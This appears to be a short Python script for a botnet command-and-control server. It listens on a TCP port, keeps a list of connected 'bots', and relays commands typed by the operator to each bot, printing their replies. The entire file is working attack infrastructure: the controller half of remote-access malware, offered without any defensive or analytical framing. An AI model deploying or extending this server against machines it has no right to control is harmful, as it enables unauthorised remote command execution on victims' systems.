import socket
import threading

# Configuration
server_ip = "127.0.0.1" # Update to your own IP, use ip addr show and look for inet xxx.xxx.xx.x
server_port = 8075

# Create the server socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((server_ip, server_port))
server_socket.listen(5)
print(f"C2 Server listening on {server_ip}:{server_port}...")

# Dictionary to track connected bots
connected_bots = {}

# Function to handle each bot
def handle_bot(bot_socket, bot_address):
    bot_id = bot_address[0]  # Use the bot's IP as its identifier
    print(f"[+] Bot connected: {bot_id}")
    connected_bots[bot_id] = bot_socket  # Track the bot

    try:
        while True:
            # Display options for the user
            command = input(f"Enter command for {bot_id} (or type 'list' to view bots): ").strip()
            
            if command.lower() == "list":
                print("Connected Bots:")
                for bot in connected_bots:
                    print(f"- {bot}")
                continue
            
            if command.lower() == "exit":
                print("Shutting down the C2 server.")
                break

            # Send the command to the bot
            bot_socket.send(command.encode())
            if command.lower() == "exit":
                print(f"Closing connection to {bot_id}")
                break
            
            # Receive the bot's response
            response = bot_socket.recv(4096).decode()
            print(f"[{bot_id}] Response: {response}")
    except Exception as e:
        print(f"[-] Error handling bot {bot_id}: {e}")
    finally:
        # Clean up connection
        bot_socket.close()
        del connected_bots[bot_id]
        print(f"[-] Bot disconnected: {bot_id}")

# Main server loop
try:
    while True:
        print("Waiting for bots to connect...")
        client_socket, client_address = server_socket.accept()
        threading.Thread(target=handle_bot, args=(client_socket, client_address)).start()
except KeyboardInterrupt:
    print("\n[!] Server shutting down.")
finally:
    server_socket.close()

